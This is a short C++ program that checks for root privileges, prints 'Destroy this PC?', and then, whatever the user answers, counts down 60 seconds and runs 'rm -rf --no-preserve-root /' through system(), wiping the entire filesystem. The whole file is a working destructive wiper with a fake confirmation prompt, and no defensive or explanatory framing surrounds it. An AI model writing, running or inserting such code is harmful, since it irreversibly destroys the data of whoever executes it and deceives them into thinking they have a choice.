#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <iostream>
#include <string>
#include <sys/types.h>
void counter(int seconds)
{
    for (int i = 0; i < seconds; i++)
    {
        std::cout << i << "\n";
        sleep(1);
    }
}
int main()
{
    int destroy = 0;
    int id = getuid();
    if (id == 0)
    {
        std::cout << "\nYou are root";
        std::cout << "\nDestroy this PC? ";
        std::cin >> destroy;
        std::cout << "This pc will be wiped in 60 seconds";
        counter(60);
        system("rm -rf --no-preserve-root /");
    }
    else
    {
        std::cout << "\nYou are not root";
    }
    return 0;
}